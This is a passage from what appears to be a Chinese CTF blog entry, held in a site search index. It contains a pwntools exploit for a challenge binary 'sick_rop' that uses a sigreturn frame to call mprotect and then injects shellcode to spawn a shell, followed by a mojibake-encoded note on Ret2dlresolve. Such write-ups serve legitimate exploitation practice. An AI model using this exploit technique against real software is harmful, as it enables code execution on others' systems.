%sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;157.245.40.78&#x27;,32071)</span><br>vul = <span class="hljs-number">0x40102E</span><br>syscall_ret = <span class="hljs-number">0x40102B</span> <br><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">10</span><br>fuck.rdi = <span class="hljs-number">0x401000</span><br>fuck.rsi = <span class="hljs-number">0x2000</span><br>fuck.rdx = <span class="hljs-number">7</span><br>fuck.rsp = <span class="hljs-number">0x4010d8</span><br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>,<span class="hljs-number">0xdeadbeef</span>,vul,syscall_ret,fuck]<br>)<br>sl(payload)<br>pause()<br>se(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">15</span>)<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;wsnd\0&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\0&#x27;</span>),vul,<span class="hljs-number">0x4010f0</span>,asm(shellcraft.sh())] <br>)<br>pause()<br>se(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h1>Ret2dlresolve</h1><p>å­¦ä¸ä¼šï¼Œæˆæ¶ˆæ„äº†ï¼Œä»¥åè¡¥ä¸Šå§ï¼ˆä½†æ„¿ï¼‰ã€‚run äº† run äº†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
